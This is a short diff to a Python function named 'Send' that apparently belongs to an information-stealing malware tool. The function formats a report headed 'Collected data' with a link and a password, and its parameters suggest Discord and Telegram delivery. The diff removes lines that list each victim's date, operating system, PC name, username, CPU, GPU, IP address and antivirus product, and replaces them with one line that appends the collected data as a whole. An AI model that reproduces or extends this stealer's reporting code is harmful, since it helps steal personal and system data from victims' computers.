@@ -47,14 +47,7 @@ def Send(type,np,data,dataB,dataO,dataW,dataF,dataV,discordData,TelegramData,xmp
 				title = f"▀▀█▀▀ █──█ █▀▀ 　 ░█▀▄▀█ █──█ █▀▀█ █─█\n─░█── █▀▀█ █▀▀ 　 ░█░█░█ █──█ █▄▄▀ █▀▄ \n─░█── ▀──▀ ▀▀▀ 　 ░█──░█ ─▀▀▀ ▀─▀▀ ▀─▀\nLink🔗:{url}\nPassword: {np[1]}\n\n⇓Collected data⇓"			
 			message += f"{title}"
 			try:
-				message += f'\n⏲Date: {data[0]}'
-				message += f'\n🖥System: {data[1]}'
-				message += f'\n👤PCname: {data[2]}'
-				message += f'\n👤Username: {data[3]}'
-				message += f'\n🔧CPU: {data[4]}'
-				message += f'\n🔧GPU: {data[5]}'
-				message += f'\n📡IP: {data[6]}'
-				message += f'\n🛡Antivirus: {data[7]}'
+				message += data
 			except Exception as e:
 				print(e)
 		except Exception as e:
